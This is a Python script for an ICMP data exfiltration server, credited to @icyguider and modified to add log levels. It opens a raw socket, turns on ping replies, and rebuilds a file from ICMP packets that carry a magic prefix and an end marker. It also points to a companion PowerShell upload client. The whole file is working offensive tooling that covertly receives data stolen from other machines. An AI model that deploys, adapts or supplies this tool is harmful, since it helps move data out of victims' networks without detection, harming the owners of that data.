#!/usr/bin/python3
#
# ICMP Data Exfiltration Server (With Log Level Selection)
# Created by Matthew David (@icyguider) - Modified

import socket
import sys
import os
import argparse
from datetime import datetime

PREFIX = b"I(mP'#v.c5_]p'pt~E{4cg%.1&~=+|"  # Unique prefix to identify valid packets
LOG_LEVELS = {"DEBUG": 0, "INFO": 1, "WARNING": 2, "ERROR": 3, "CRITICAL": 4}

def log(level, message):
    """Print log messages with timestamp based on the selected log level."""
    if LOG_LEVELS[level] >= LOG_LEVELS[current_log_level]:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

def enablePingReply():
    try:
        with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "r+") as f:
            if f.read()[0] != "0":
                os.system('echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
    except:
        log("ERROR", "You need to run this tool with administrator privileges.")
        sys.exit()

def main(filename):
    enablePingReply()

    if os.path.exists(filename):
        overwrite = input("The supplied file already exists. Overwrite it? (Y/n): ")
        if overwrite.lower() == "y":
            os.remove(filename)
            log("INFO", f"Existing file {filename} was overwritten.")

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    log("INFO", "ICMP server started, waiting for connections.")
    print("Server ready and listening for ICMP packets...")
    print("Use ICMP Exfil client: Invoke-IcmpUpload server file")

    last = b""
    first = True

    while True:
        data, addr = s.recvfrom(1508)
        payload = data[28:]  # Extract payload after ICMP headers

        # Check for prefix to identify valid packets
        if payload.startswith(PREFIX):
            if first:
                log("INFO", f"Connection received from {addr[0]}")
                first = False

            clean_payload = payload[len(PREFIX):]  # Remove prefix

            if b'i(mpeXf!1+>c0Mp{e+3d' == clean_payload:
                log("INFO", "File transfer completed successfully.")
                sys.exit()

            if clean_payload != last:
                with open(filename, 'ab') as f:
                    f.write(clean_payload)
                last = clean_payload
                log("DEBUG", f"Received {len(clean_payload)} bytes from {addr[0]}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ICMP File Upload Server with Log Level Selection')
    parser.add_argument("file", help="File to write data to", type=str)
    parser.add_argument("--log-level", choices=LOG_LEVELS.keys(), default="INFO", help="Set the logging level (default: INFO)")

    args = parser.parse_args()
    current_log_level = args.log_level  # Set global log level

    main(args.file)
